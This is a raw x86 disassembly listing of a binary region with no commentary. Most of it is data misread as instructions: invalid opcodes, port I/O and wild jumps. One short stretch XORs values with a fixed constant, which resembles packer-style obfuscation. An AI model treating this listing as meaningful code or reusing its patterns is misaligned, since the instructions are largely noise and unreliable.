  41ac9f:	in     eax,0xb1
  41aca1:	shr    BYTE PTR [ebx-0x28121f34],1
  41aca7:	stc    
  41aca8:	in     eax,0xea
  41acaa:	stc    
  41acab:	mov    eax,0xcdc8cebb
  41acb0:	mov    edi,0xc0f5e3da
  41acb5:	out    0xf6,eax
  41acb7:	leave  
  41acb8:	add    ecx,DWORD PTR ds:0xc90fe8e5
  41acbe:	mov    ebp,0xc4bcd0cc
  41acc3:	jecxz  0x41acb4
  41acc5:	loopne 0x41ac7b
  41acc7:	(bad)  
  41acc9:	call   0xf30d7aac
  41acce:	sar    DWORD PTR [esi+eax*1-0x142431a],1
  41acd5:	cmc    
  41acd6:	aam    0xf9
  41acd8:	retf   0xf00
  41acdb:	out    dx,eax
  41acdc:	shl    ecx,0xcd
  41acdf:	icebp  
  41ace0:	loop   0x41acd0
  41ace2:	mov    al,0xe2
  41ace4:	cli    
  41ace5:	mov    dl,0xf9
  41ace7:	fcomip st,st(2)
  41ace9:	mov    edi,0xe1f9f1ca
  41acee:	jmp    0xc14980b2
  41acf3:	repz sar dl,cl
  41acf6:	loope  0x41ace7
  41acf8:	pop    es
  41acf9:	fld    QWORD PTR [edx]
  41acfb:	pop    es
  41acfc:	int    0xd9
  41acfe:	iret   
  41acff:	mov    esi,0xd1e2aef0
  41ad04:	rol    dl,0xe1
  41ad07:	fcmovu st,st(6)
  41ad09:	(bad)
  41ad0c:	neg    bl
  41ad0e:	std    
  41ad0f:	loope  0x41acf1
  41ad11:	stc    
  41ad12:	sti    
  41ad13:	in     al,0xd9
  41ad15:	in     eax,0xd4
  41ad17:	in     eax,0xe3
  41ad19:	out    dx,al
  41ad1a:	push   es
  41ad1b:	in     eax,dx
  41ad1c:	add    ecx,esi
  41ad1e:	(bad)
  41ad21:	test   al,0xd3
  41ad23:	mov    bl,0xcb
  41ad25:	out    0xef,al
  41ad27:	loopne 0x41acf8
  41ad29:	fcom   st(0)
  41ad2b:	ror    ch,1
  41ad2d:	std    
  41ad2e:	iret   
  41ad2f:	mov    edi,0xece2c0d7
  41ad34:	mov    eax,0xde0c6de
  41ad3a:	pop    es
  41ad3b:	out    dx,eax
  41ad3c:	jmp    0x41ad25
  41ad3e:	icebp  
  41ad3f:	in     eax,0xd1
  41ad41:	(bad)  
  41ad42:	hlt    
  41ad43:	mov    al,0xf2
  41ad45:	jmp    0xbae5:0xf7f3c6e9
  41ad4c:	sti    
  41ad4d:	enter  0xd400,0x7
  41ad51:	in     eax,dx
  41ad52:	loope  0x41ad40
  41ad54:	cli    
  41ad55:	jmp    ecx
  41ad57:	fisttp QWORD PTR [eax]
  41ad59:	lds    eax,FWORD PTR [edx]
  41ad5b:	add    al,0xe6
  41ad5d:	retf   
  41ad5e:	shl    dl,0xc1
  41ad61:	in     eax,dx
  41ad62:	shl    ecx,1
  41ad64:	icebp  
  41ad65:	aad    0xc6
  41ad67:	mov    dh,0xbf
  41ad69:	jmp    0xed05a521
  41ad6e:	iret   
  41ad6f:	out    0xf2,eax
  41ad71:	repnz stc 
  41ad73:	in     eax,0xda
  41ad75:	repnz xlat BYTE PTR ds:[ebx]
  41ad77:	or     al,BYTE PTR [edi]
  41ad79:	or     eax,0xcfcd8da
  41ad7e:	(bad)  
  41ad7f:	rcl    cl,cl
  41ad81:	mov    dl,0xb7
  41ad83:	mov    cl,0xf2
  41ad85:	retf   
  41ad86:	jmp    0xf2cb:0xceb8d0ca
  41ad8d:	fadd   st,st(1)
  41ad8f:	hlt    
  41ad90:	pop    es
  41ad91:	ret    0xbede
  41ad94:	cli    
  41ad95:	cli    
  41ad96:	out    0xd4,eax
  41ad98:	rol    DWORD PTR [edi],0xd9
  41ad9b:	call   0xddeeb189
  41ada0:	into   
  41ada1:	loopne 0x41ad8f
  41ada3:	mov    esp,0xb2d6d5c9
  41ada8:	hlt    
  41ada9:	int3   
  41adaa:	call   0xf733898a
  41adaf:	aam    0xfb
  41adb1:	in     eax,dx
  41adb2:	mov    ebp,0xf900cbdb
  41adb7:	fcmovne st,st(0)
  41adb9:	out    0xa,al
  41adbb:	adc    eax,DWORD PTR [esi]
  41adbd:	icebp  
  41adbe:	iret   
  41adbf:	out    dx,al
  41adc0:	div    ebp
  41adc2:	scas   al,BYTE PTR es:[edi]
  41adc3:	mov    dl,0xf3
  41adc5:	loope  0x41adb0
  41adc7:	into   
  41adc8:	jmp    0x41adb8
  41adca:	mov    eax,0xef02c3b6
  41adcf:	ret    0x7b5
  41add2:	(bad)  
  41add3:	jecxz  0x41addc
  41add5:	dec    cl
  41add7:	leave  
  41add8:	(bad)  
  41add9:	(bad)  
  41addb:	clc    
  41addc:	or     esi,ebp
  41adde:	stos   DWORD PTR es:[edi],eax
  41addf:	int    0xef
  41ade1:	int3   
  41ade2:	retf   
  41ade3:	mov    cl,0xc1
  41ade5:	mov    ah,0xf5
  41ade7:	sar    edx,cl
  41ade9:	cli    
  41adea:	jmp    0xf23f6cbb
  41adef:	fcmovnbe st,st(7)
  41adf1:	pop    es
  41adf2:	add    ah,dh
  41adf4:	retf   
  41adf5:	add    eax,0xfe09fd08
  41adfa:	call   0xb334afec
  41adff:	out    0xcc,al
  41ae01:	mov    ebp,0xc6f2aee0
  41ae06:	jmp    0xdf0e69e4
  41ae0b:	test   ecx,0xfbc1bbca
  41ae11:	int    0x1
  41ae13:	mov    esp,0xeff7d805
  41ae18:	fiadd  DWORD PTR [eax]
  41ae1a:	(bad)  
  41ae1c:	dec    DWORD PTR [edx]
  41ae1e:	rcr    esp,0xed
  41ae21:	aad    0xb5
  41ae23:	rol    edx,cl
  41ae25:	mov    ah,0xe8
  41ae27:	mov    eax,0xfff7e4e7
  41ae2c:	stc    
  41ae2d:	repz rol DWORD PTR [ebx],cl
  41ae30:	std    
  41ae31:	pop    es
  41ae32:	aam    0xd1
  41ae34:	aad    0xd5
  41ae36:	(bad)  
  41ae37:	frstpm(287 only) 
  41ae39:	std    
  41ae3a:	int    0xcb
  41ae3c:	jmp    0xf4399222
  41ae41:	repnz shl dl,cl
  41ae44:	lock leave 
  41ae46:	stc    
  41ae47:	fmul   st,st(3)
  41ae49:	clc    
  41ae4a:	in     eax,dx
  41ae4b:	(bad)  
  41ae4d:	inc    bl
  41ae4f:	aam    0xd9
  41ae51:	push   es
  41ae52:	cld    
  41ae53:	stc    
  41ae54:	shl    esi,cl
  41ae56:	cli    
  41ae57:	rol    esi,0xe0
  41ae5a:	jmp    0xc701c22c
  41ae5f:	test   eax,0xd0b1f6ce
  41ae64:	test   eax,0xf5b0ecc4
  41ae69:	out    0xc5,al
  41ae6b:	(bad)  
  41ae6c:	sti    
  41ae6d:	in     al,dx
  41ae6e:	fcomi  st,st(0)
  41ae70:	repz out 0xc7,eax
  41ae73:	(bad)  
  41ae74:	add    al,0xe2
  41ae76:	(bad)  
  41ae77:	xadd   edx,edi
  41ae7a:	std    
  41ae7b:	in     eax,dx
  41ae7c:	rol    DWORD PTR [edx],0xc3
  41ae7f:	xlat   BYTE PTR ds:[ebx]
  41ae80:	iret   
  41ae81:	mov    dh,0xe5
  41ae83:	mul    esp
  41ae85:	mov    ch,0xe5
  41ae87:	mov    cl,0xd6
  41ae89:	repz into 
  41ae8b:	jmp    0xe0ef:0xfaffd3fb
  41ae92:	stc    
  41ae93:	shl    ah,0xf0
  41ae96:	lock fsubr st(5),st
  41ae99:	pmullw mm0,mm6
  41ae9c:	or     bl,ah
  41ae9e:	(bad)  
  41ae9f:	(bad)  
  41aea1:	enter  0xedd4,0xb4
  41aea5:	rcr    cl,1
  41aea7:	mov    edx,0xf3def7ea
  41aeac:	(bad)  
  41aead:	dec    ebp
  41aeaf:	fucom  st(1)
  41aeb1:	(bad)  
  41aeb3:	ret    0xdde5
  41aeb6:	jmp    0x41aebe
  41aeb8:	or     ecx,ebx
  41aeba:	(bad)  
  41aebb:	stc    
  41aebc:	(bad)  
  41aebe:	lds    ebp,FWORD PTR [esi-0x39342e30]
  41aec4:	test   eax,0xefb4f5b7
  41aec9:	jmp    0x41ae9a
  41aecb:	in     al,0xd0
  41aecd:	cli    
  41aece:	int3   
  41aecf:	mov    esp,0xc1dbf506
  41aed4:	rcr    edx,1
  41aed6:	inc    eax
  41aed8:	out    0xdf,al
  41aeda:	add    DWORD PTR [edx+ebx*8],ecx
  41aedd:	add    eax,0xf7e5cfce
  41aee2:	jmp    0xe53271aa
  41aee7:	mov    eax,0xdffaf9f4
  41aeec:	fcmovne st,st(0)
  41aeee:	out    dx,eax
  41aeef:	(bad)  
  41aef0:	fst    st(5)
  41aef2:	(bad)  
  41aef3:	mov    ebp,0xe2dbc2d1
  41aef8:	add    al,0xe0
  41aefa:	pop    es
  41aefb:	clc    
  41aefc:	cli    
  41aefd:	out    0xf1,al
  41aeff:	scas   eax,DWORD PTR es:[edi]
  41af00:	call   0xbbf278cb
  41af05:	out    0xb7,eax
  41af07:	icebp  
  41af08:	lods   eax,DWORD PTR ds:[esi]
  41af09:	(bad)  
  41af0a:	mov    bl,0xd7
  41af0c:	lock (bad) 
  41af0f:	clc    
  41af10:	mov    ebp,0xc0f5daf0
  41af15:	cmc    
  41af16:	(bad)  
  41af17:	ud0    eax,esi
  41af1a:	or     dl,cl
  41af1c:	(bad)  
  41af1d:	out    dx,al
  41af1e:	int3   
  41af1f:	lock int 0xc7
  41af22:	shl    edi,0xe2
  41af25:	mul    ah
  41af27:	repz int 0xd1
  41af2a:	mov    bl,0xde
  41af2c:	sar    BYTE PTR [edi-0x31303725],cl
  41af32:	rol    BYTE PTR [eax],cl
  41af34:	les    eax,FWORD PTR [ebx]
  41af36:	or     bh,dl
  41af38:	push   cs
  41af39:	jmp    0x41af33
  41af3b:	dec    DWORD PTR [ebx]
  41af3d:	adc    ebx,esi
  41af3f:	fucomip st,st(6)
  41af41:	rcl    cl,cl
  41af43:	loop   0x41aef6
  41af45:	mov    dl,0xf1
  41af47:	ror    dh,0xd7
  41af4a:	aam    0xfa
  41af4c:	enter  0xb7f8,0xbf
  41af50:	icebp  
  41af51:	hlt    
  41af52:	clc    
  41af53:	std    
  41af54:	mov    ecx,0xd600c5f8
  41af59:	or     al,BYTE PTR [ebx]
  41af5b:	or     eax,esp
  41af5d:	in     al,dx
  41af5e:	mov    bl,0xc2
  41af60:	loopne 0x41af42
  41af62:	lods   eax,DWORD PTR ds:[esi]
  41af63:	icebp  
  41af64:	repz mov bl,0xe7
  41af67:	clc    
  41af68:	fcompp 
  41af6a:	sti    
  41af6b:	cld    
  41af6c:	hlt    
  41af6d:	xlat   BYTE PTR ds:[ebx]
  41af6e:	add    ebp,edi
  41af70:	out    0xf2,eax
  41af72:	cli    
  41af73:	fcomp  st(2)
  41af75:	jmp    0xe628ab3d
  41af7a:	hlt    
  41af7b:	fldl2e 
  41af7d:	enter  0xd8e6,0xef
  41af81:	out    dx,al
  41af82:	aam    0xdc
  41af84:	test   eax,0xcbe5b2cb
  41af89:	(bad)  
  41af8a:	mov    ebp,0xfce1ccc8
  41af8f:	mov    ecx,0xc6bbc200
  41af94:	add    edx,ebp
  41af96:	(bad)  
  41af97:	cli    
  41af98:	loop   0x41af72
  41af9a:	out    0xce,al
  41af9c:	or     ebx,esp
  41af9e:	mov    ebp,0xc1e4afe0
  41afa3:	(bad)  
  41afa4:	shl    BYTE PTR [ecx-0x40154d30],1
  41afaa:	fsubr  st,st(0)
  41afac:	mov    edi,0xcee1eee3
  41afb1:	jecxz  0x41afa0
  41afb3:	jecxz  0x41afb3
  41afb5:	cmc    
  41afb6:	add    al,dl
  41afb8:	call   0xea0d78c8
  41afbd:	cld    
  41afbe:	lock retf 
  41afc0:	rcr    dh,cl
  41afc2:	repnz rol ah,1
  41afc5:	aad    0xea
  41afc7:	sti    
  41afc8:	out    0x5,eax
  41afca:	sti    
  41afcb:	jb     0x41afff
  41afcd:	add    BYTE PTR [ebx-0x13b73],cl
  41afd3:	jmp    FWORD PTR [ebx]
  41afd5:	enter  0x8d89,0xf4
  41afd9:	(bad)  
  41afda:	(bad)  
  41afdb:	inc    edi
  41afdd:	test   esp,ebp
  41afdf:	(bad)  
  41afe0:	(bad)  
  41afe1:	(bad)  
  41afe2:	mov    edi,0x81f89c85
  41afe7:	mov    ebp,0xfffffefc
  41afec:	mov    al,0x85
  41afee:	pushf  
  41afef:	clc    
  41aff0:	je     0x421d21
  41aff6:	mov    eax,DWORD PTR [ebp-0x11c]
  41affc:	xor    eax,0x75108b5
  41b001:	mov    ecx,DWORD PTR [ebp-0x11c]
  41b007:	xor    ecx,0x75108b5
  41b00d:	lea    ecx,[eax+ecx*1+0x64e5f6]
  41b014:	mov    eax,DWORD PTR [ebp-0x10c]
  41b01a:	xor    edx,edx
  41b01c:	div    ecx
  41b01e:	mov    eax,DWORD PTR [ebp-0x104]
  41b024:	xor    eax,0x75108b5
  41b029:	add    eax,0x3272fb
  41b02e:	mov    ecx,DWORD PTR [ebp-0x11c]
  41b034:	xor    ecx,0x75108b5
  41b03a:	jmp    0x41d3e0
  41b03f:	cli    
  41b040:	adc    BYTE PTR [ebx+0x2c24b1fd],ch
  41b046:	adc    al,0x9e
  41b048:	pmulhuw mm0,QWORD PTR [esi]
  41b04b:	mov    ds:0xc005fe8a,eax
  41b050:	fidivr DWORD PTR [edx+0x7b]
  41b053:	add    bl,BYTE PTR [eax-0xf048485]
  41b059:	test   dh,0xdd
  41b05c:	mov    ecx,0xe5f8dfc8
  41b061:	add    bh,cl
  41b063:	fld    QWORD PTR [eax]
  41b065:	faddp  st(0),st
  41b067:	enter  0x203,0x6
  41b06b:	cld    
  41b06c:	mov    edi,0xadd3c8e5
  41b071:	(bad)  
  41b072:	mov    cl,0xdb
  41b075:	fprem1 
  41b077:	in     eax,0xb6
  41b079:	repnz cli 
  41b07b:	mov    edi,0x2d0e0e2
  41b080:	loope  0x41b056
  41b082:	shl    ecx,cl
  41b084:	cld    
  41b085:	lock out dx,al
  41b087:	cmc    
  41b088:	add    BYTE PTR [ecx],cl
  41b08a:	ficom  WORD PTR [ebx]
  41b08c:	jmp    0xf6e5:0xe1d1f3dc
  41b093:	mov    edx,0xd4daf4ec
  41b098:	div    bl
  41b09a:	add    bh,BYTE PTR [eax-0x7054345]
  41b0a0:	in     al,dx
  41b0a1:	std    
  41b0a2:	lock repnz jecxz 0x41b0ac
  41b0a6:	mov    dh,0x5
  41b0a9:	out    dx,eax
  41b0aa:	iret   
  41b0ab:	(bad)  
  41b0ad:	mov    bl,0xac
  41b0af:	fsubp  st(5),st
  41b0b1:	rcl    ecx,1
  41b0b3:	cli    
  41b0b4:	out    dx,al
  41b0b5:	mov    ch,0xc8
  41b0b7:	mov    ecx,0xbff2e4b6
  41b0bc:	out    dx,eax
  41b0bd:	sar    ecx,0xd8
  41b0c0:	fsubr  st(2),st
  41b0c2:	(bad)  
  41b0c3:	fld    DWORD PTR [ebx]
  41b0c5:	(bad)  
  41b0c7:	or     ecx,eax
  41b0c9:	or     al,0xe8
  41b0cb:	out    dx,eax
  41b0cc:	mov    eax,0xf3e3dfe6
  41b0d1:	shl    BYTE PTR [ebp-0x36394d1e],cl
  41b0d7:	out    dx,eax
  41b0d8:	clc    
  41b0d9:	(bad)  
  41b0db:	sti    
  41b0dc:	mov    bh,0xf0
  41b0de:	fcmovnb st,st(3)
  41b0e0:	fild   DWORD PTR ds:0xfa0200d8
  41b0e6:	retf   
  41b0e7:	or     bl,al
  41b0e9:	out    dx,al
  41b0ea:	fld    DWORD PTR [eax]
  41b0ec:	repz out dx,al
  41b0ee:	out    dx,al
  41b0ef:	icebp  
  41b0f0:	stos   DWORD PTR es:[edi],eax
  41b0f1:	iret   
  41b0f2:	rcl    edi,1
  41b0f4:	(bad)  
  41b0f5:	ror    ecx,cl
  41b0f7:	jmp    0xfef4:0xd1d4def1
  41b0fe:	out    0xd5,eax
  41b100:	std    
  41b101:	cli    
  41b102:	(bad)  
  41b103:	ffree  st(5)
  41b105:	out    dx,eax
  41b106:	cld    
  41b107:	in     eax,dx
  41b108:	or     cl,BYTE PTR [edi]
  41b10a:	adc    eax,DWORD PTR [edi]
  41b10c:	mov    edi,0xe3c9eaaa
  41b111:	iret   
  41b112:	(bad)  
  41b113:	repnz repnz in eax,0xd6
  41b117:	sti    
  41b118:	mov    ah,0xef
  41b11a:	icebp  
  41b11b:	jmp    0xf7389f09
  41b120:	(bad)
  41b123:	add    dh,al
  41b125:	fld    QWORD PTR [esi+edi*8]
  41b128:	jmp    0xab54be0c
  41b12d:	ret    
  41b12e:	(bad)  
  41b12f:	ret    0xd4f4
  41b132:	mov    ebp,0xdebbb8ce
  41b138:	in     al,0xbb
  41b13a:	std    
  41b13b:	lock shl dl,cl
  41b13e:	out    0xe2,eax
  41b140:	(bad)
  41b143:	rol    BYTE PTR [ecx],0xc6
  41b146:	push   cs
  41b147:	jmp    0x41b131
  41b149:	in     al,0xf3
  41b14b:	rcl    ecx,cl
  41b14d:	mov    dl,0xf3
  41b14f:	(bad)
  41b152:	shr    bh,0xe5
  41b155:	out    0xcd,al
  41b157:	(bad)  
  41b159:	mov    ebp,0xe2bdb4fd
  41b15e:	out    dx,al
  41b15f:	std    
  41b160:	pop    es
  41b161:	rol    DWORD PTR [esi],0xd0
  41b164:	jmp    0x41b136
  41b166:	or     esi,edx
  41b168:	clc    
  41b169:	in     eax,dx
  41b16a:	int3   
  41b16b:	or     DWORD PTR [ebp-0x361e391e],ebp
  41b171:	leave  
  41b172:	idiv   cl
  41b174:	jmp    0xc0356d6a
  41b179:	cmc    
  41b17a:	loop   0x41b14b
  41b17c:	hlt    
  41b17d:	out    0xed,eax
  41b17f:	mov    ebp,0xc5dec0d4
  41b184:	(bad)  
  41b185:	mov    BYTE PTR [eax],0xea
  41b188:	add    esp,ebx
  41b18a:	fucom  st(2)
  41b18c:	(bad)  
  41b18e:	xlat   BYTE PTR ds:[ebx]
  41b18f:	repnz jecxz 0x41b163
  41b192:	(bad)  
  41b193:	lock lock shl BYTE PTR [eax-0x8311b41],1
  41b19b:	fcmovu st,st(5)
  41b19d:	out    dx,al
  41b19e:	stc    
  41b19f:	dec    esp
  41b1a1:	mov    ebp,0xe5ebf5cb
  41b1a6:	add    eax,0xe7fdda06
  41b1ab:	fsubr  st,st(1)
  41b1ad:	sar    DWORD PTR [esi-0x1f1d333e],cl
  41b1b3:	in     eax,dx
  41b1b4:	shr    ebx,cl
  41b1b6:	mov    ecx,0xf3c9f1d3
  41b1bb:	mov    esi,0xc0d0bfee
  41b1c0:	mov    esp,0xd109ded1
  41b1c5:	fucomi st,st(0)
  41b1c7:	loopne 0x41b1d1
  41b1c9:	pop    es
  41b1ca:	std    
  41b1cb:	into   
  41b1cc:	lods   al,BYTE PTR ds:[esi]
  41b1cd:	stos   BYTE PTR es:[edi],al
  41b1ce:	mov    cl,0xe6
  41b1d0:	rol    cl,0xc0
  41b1d3:	int    0xc6
  41b1d5:	mov    ah,0xb5
  41b1d7:	(bad)
  41b1da:	jmp    ebx
  41b1dc:	loop   0x41b1bb
  41b1de:	mov    eax,0xe302bc06
  41b1e3:	inc    DWORD PTR ds:0xee060a0a
  41b1e9:	les    eax,FWORD PTR [edx]
  41b1eb:	leave  
  41b1ec:	stos   DWORD PTR es:[edi],eax
  41b1ed:	jecxz  0x41b1dc
  41b1ef:	cmc    
  41b1f0:	shr    BYTE PTR [ebp-0x300f0439],cl
  41b1f6:	xlat   BYTE PTR ds:[ebx]
  41b1f7:	call   0xf70f7fee
  41b1fc:	mov    edi,0xfff8e7bd
  41b201:	fcomip st,st(5)
  41b203:	std    
  41b204:	call   0x52fb103
  41b209:	add    ebx,esi
  41b20b:	shr    DWORD PTR [eax+ebp*4-0xb4e1b23],cl
  41b212:	leave  
  41b213:	shl    DWORD PTR [ebp+ecx*8-0x450d170c],cl
  41b21a:	mov    ebx,0xbed3fed8
  41b21f:	int    0xe0
  41b221:	out    0xd9,eax
  41b223:	out    0xdb,al
  41b225:	fmul   DWORD PTR [eax]
  41b227:	jmp    0xf24fbefb
  41b22c:	jmp    0x41b1ff
  41b22e:	jmp    0xecf3:0xbbebadaf
  41b235:	cmc    
  41b236:	(bad)  
  41b238:	mov    edx,0xd503bfff
  41b23d:	ret    0xdee0
  41b240:	out    0xc1,al
  41b242:	add    al,0xca
  41b244:	jmp    0xfe429913
  41b249:	call   0xbd13b050
  41b24e:	scas   eax,DWORD PTR es:[edi]
  41b24f:	out    0xe3,eax
  41b251:	into   
  41b252:	mov    ebx,0xb6b7c9c6
  41b257:	out    dx,al
  41b258:	cli    
  41b259:	aam    0xfa
  41b25b:	add    ebx,ebp
  41b25d:	ror    esi,0xd1
  41b260:	xlat   BYTE PTR ds:[ebx]
  41b261:	(bad)  
  41b262:	cli    
  41b263:	ret    
  41b264:	ffree  st(5)
  41b266:	jmp    0x124fc265
  41b26b:	in     eax,dx
  41b26c:	loope  0x41b234
  41b26e:	mul    DWORD PTR [esi+ebp*4-0x3e2f1a4d]
  41b275:	jmp    0x41b251
  41b277:	hlt    
  41b278:	(bad)  
  41b279:	cli    
  41b27a:	out    dx,eax
  41b27b:	in     eax,dx
  41b27c:	ffree  st(2)
  41b27e:	(bad)  
  41b27f:	int3   
  41b280:	in     al,0xf2
  41b282:	hlt    
  41b283:	sar    dl,cl
  41b285:	jmp    0xf2e9:0xe6e20fc7
  41b28c:	out    dx,al
  41b28d:	xlat   BYTE PTR ds:[ebx]
  41b28e:	mov    edi,0xceadaccb
  41b293:	repz rcl ah,cl
  41b296:	icebp  
  41b297:	jmp    0x41b298
  41b299:	fnstcw WORD PTR [ecx-0xe1d2232]
  41b29f:	loopne 0x41b28d
  41b2a1:	shl    al,0xc2
  41b2a4:	or     eax,DWORD PTR [eax]
  41b2a6:	or     al,ch
  41b2a8:	aam    0xeb
  41b2aa:	jmp    0x41b2a5
  41b2ac:	lock icebp 
  41b2ae:	loopne 0x41b27c
  41b2b0:	int3   
  41b2b1:	mov    esp,0xf1b3e6b1
  41b2b6:	mov    ecx,0xbad3c9eb
  41b2bb:	loop   0x41b2b7
  41b2bd:	shl    cl,1
  41b2bf:	sar    ebp,cl
  41b2c1:	jmp    0x41b299
  41b2c3:	jecxz  0x41b2a8
  41b2c5:	rol    ecx,0xfb
  41b2c8:	out    0xd,eax
  41b2ca:	out    dx,eax
  41b2cb:	rcr    al,cl
  41b2cd:	mov    eax,0xc5b3c5ae
  41b2d2:	mov    ch,0xc0
  41b2d4:	(bad)  
  41b2d5:	mov    ebx,0xdfdcf1df
  41b2da:	retf   
  41b2db:	add    eax,esp
  41b2dd:	mov    edi,0xc3e5e7dd
  41b2e2:	add    eax,0xddf0ffff
  41b2e7:	(bad)  
  41b2e9:	or     ecx,DWORD PTR [ebx]
  41b2eb:	or     DWORD PTR [edi-0x34233638],edi
  41b2f1:	leave  
  41b2f2:	call   0xd4f66ddf
  41b2f7:	fcmovnu st,st(3)
  41b2f9:	leave  
  41b2fa:	loop   0x41b2f0
  41b2fc:	loopne 0x41b2ef
  41b2fe:	hlt    
  41b2ff:	cli    
  41b300:	add    eax,esi
  41b302:	cli    
  41b303:	out    0xe3,al
  41b305:	retf   
  41b306:	fsubr  st,st(3)
  41b308:	add    eax,0xc5ccfcd4
  41b30d:	out    0xe8,al
  41b30f:	loopne 0x41b301
  41b311:	retf   0xd7c5
  41b314:	rol    al,cl
  41b316:	leave  
  41b317:	(bad)  
  41b318:	(bad)  
  41b319:	(bad)  
  41b31b:	fucomi st,st(6)
  41b31d:	sti    
  41b31e:	cli    
  41b31f:	add    bh,BYTE PTR [esi-0xf032826]
  41b325:	clc    
  41b326:	fdiv   st,st(4)
  41b328:	push   cs
  41b329:	retf   0xd2df
  41b32c:	mov    bl,0xec
  41b32e:	lods   al,BYTE PTR ds:[esi]
  41b32f:	loopne 0x41b2dc
  41b331:	loop   0x41b30a
  41b333:	shl    BYTE PTR [ecx-0x62d244a],1
  41b339:	leave  
  41b33a:	jmp    0xd405:0xced5fcff
  41b341:	ret    
  41b342:	fcmovu st,st(1)
  41b344:	fsubr  st,st(0)
  41b346:	jmp    0xf3d9:0xfae4e9e9
  41b34d:	(bad)  
  41b34e:	mov    bh,0xc4
  41b350:	shl    cl,0xeb
  41b353:	out    dx,al
  41b354:	into   
  41b355:	mov    bh,0xff
  41b357:	cmc    
  41b358:	enter  0xddde,0xbf
  41b35c:	repz mov eax,0xfe01d1d2
  41b362:	fisttp DWORD PTR [ecx]
  41b364:	add    eax,0xc05f7de
  41b369:	int    0xa
  41b36b:	out    dx,eax
  41b36c:	shr    edx,1
  41b36e:	(bad)
  41b371:	(bad)  
  41b372:	cmc    
  41b373:	loope  0x41b342
  41b375:	(bad)  
  41b377:	shl    DWORD PTR [ebx-0x3627120c],cl
  41b37d:	jecxz  0x41b377
  41b37f:	out    0xdf,al
  41b381:	add    ebx,edi
  41b383:	loope  0x41b35b
  41b385:	loop   0x41b36a
  41b387:	cld    
  41b388:	add    ecx,ebp
  41b38a:	ficom  WORD PTR [ecx]
  41b38c:	(bad)  
  41b38d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b38e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b38f:	rcl    ecx,cl
  41b391:	(bad)  
  41b392:	(bad)  
  41b393:	stc    
  41b394:	retf   0xb9b4
  41b397:	retf   0xceee
  41b39a:	mov    cl,0xf3
  41b39c:	int    0xb8
  41b39e:	rcl    bl,0x6
  41b3a1:	in     al,dx
  41b3a2:	idiv   BYTE PTR [esp+eax*1-0x1f1af81c]
  41b3a9:	push   es
  41b3aa:	add    eax,0xb0dfe6f9
  41b3af:	ret    
  41b3b0:	hlt    
  41b3b1:	(bad)
  41b3b4:	in     eax,dx
  41b3b5:	shl    dh,0xf3
  41b3b8:	aad    0xc9
  41b3ba:	add    edi,edx
  41b3bc:	repnz aad 0x0
  41b3bf:	into   
  41b3c0:	loope  0x41b37f
  41b3c2:	add    edi,ebx
  41b3c4:	(bad)  
  41b3c5:	rol    BYTE PTR [ebx],1
  41b3c7:	add    ecx,ecx
  41b3c9:	retf   0x7d3
  41b3cc:	out    dx,al
  41b3cd:	mov    cl,0xb1
  41b3cf:	cmc    
  41b3d0:	loop   0x41b3c1
  41b3d2:	jmp    0xd2f8:0xd8e5faf2
  41b3d9:	retf   0xfbbc
  41b3dc:	fucomi st,st(6)
  41b3de:	jecxz  0x41b3c2
  41b3e0:	clc    
  41b3e1:	mov    esi,0xf6e0e6f1
  41b3e6:	out    0x2,eax
  41b3e8:	(bad)  
  41b3ea:	retf   0xd2ff
  41b3ed:	(bad)  
  41b3ee:	mov    dl,0xbd
  41b3f0:	iret   
  41b3f1:	ret    
  41b3f2:	enter  0xd1f5,0xb8
  41b3f6:	repz enter 0xcbd5,0xd6
  41b3fb:	mov    edx,0xe5d2eff7
  41b400:	out    0xf4,al
  41b402:	out    0xd1,eax
  41b404:	stc    
  41b405:	mov    esi,0xddc3cbe9
  41b40a:	stc    
  41b40b:	or     al,0xd9
  41b40d:	in     eax,dx
  41b40e:	ret    
  41b40f:	leave  
  41b410:	shl    bl,0xb7
  41b413:	cli    
  41b414:	shl    BYTE PTR [edx+esi*8-0x280a312d],1
  41b41b:	cmc    
  41b41c:	repz cli 
  41b41e:	mov    ebp,0xfdebbbd5
  41b423:	shl    bh,1
  41b425:	(bad)  
  41b426:	inc    DWORD PTR [esi]
  41b428:	or     eax,edx
  41b42a:	retf   
  41b42b:	std    
  41b42c:	shl    cl,1
  41b42e:	ret    
  41b42f:	icebp  
  41b430:	in     al,dx
  41b431:	mov    cl,0xe4
  41b433:	jmp    0xf7cb:0xf0f4c0e7
  41b43a:	(bad)  
  41b43b:	shr    ah,cl
  41b43d:	mov    edx,0xdbe5bce3
  41b442:	repnz lock aad 0xd5
  41b446:	or     esp,edx
  41b448:	clc    
  41b449:	(bad)  
  41b44a:	jmp    0xf4c4:0xe9f1c0e1
  41b451:	mov    cl,0xd1
  41b454:	mov    dh,0xc0
  41b456:	out    0xeb,al
  41b458:	(bad)  
  41b459:	in     al,0xcd
  41b45b:	sti    
  41b45c:	add    cl,ah
  41b45e:	icebp  
  41b45f:	add    eax,0xfb0a07cd
  41b464:	in     eax,0xe1
  41b466:	(bad)  
  41b468:	(bad)  
  41b46a:	out    0xc9,eax
  41b46c:	retf   0xaeac
  41b46f:	int3   
  41b470:	(bad)  
  41b472:	ret    
  41b473:	(bad)  
  41b474:	call   0xd23d8e4b
  41b479:	mov    edi,0xd7d0b9bc
  41b47e:	rcl    cl,1
  41b480:	rcr    bl,0xd7
  41b483:	retf   
  41b484:	jecxz  0x41b491
  41b486:	(bad)  
  41b488:	clc    
  41b489:	std    
  41b48a:	jmp    0xe8cc:0xcce4bfe7
  41b491:	leave  
  41b492:	jmp    0xbbfe:0xb8c5f2fb
  41b499:	fyl2xp1 
  41b49b:	out    dx,eax
  41b49c:	fidivr WORD PTR [ebp-0x2902ff24]
  41b4a2:	fcomip st,st(6)
  41b4a4:	mov    edi,0xffdfcef
  41b4a9:	leave  
  41b4aa:	add    eax,DWORD PTR [ecx]
  41b4ac:	(bad)  
  41b4ad:	repnz rcr ebp,1
  41b4b0:	aad    0xad
  41b4b2:	lock lods al,BYTE PTR ds:[esi]
  41b4b4:	scas   eax,DWORD PTR es:[edi]
  41b4b5:	rcl    dl,0xca
  41b4b8:	int    0xca
  41b4ba:	iret   
  41b4bb:	clc    
  41b4bc:	loop   0x41b491
  41b4be:	fcomip st,st(3)
  41b4c0:	fidivr WORD PTR [edx+0xaebe0d3]
  41b4c6:	fimul  WORD PTR [ebx]
  41b4c8:	push   es
  41b4c9:	fdiv   st(4),st
  41b4cb:	clc    
  41b4cc:	mov    eax,0xd5c9a8e5
  41b4d1:	ret    
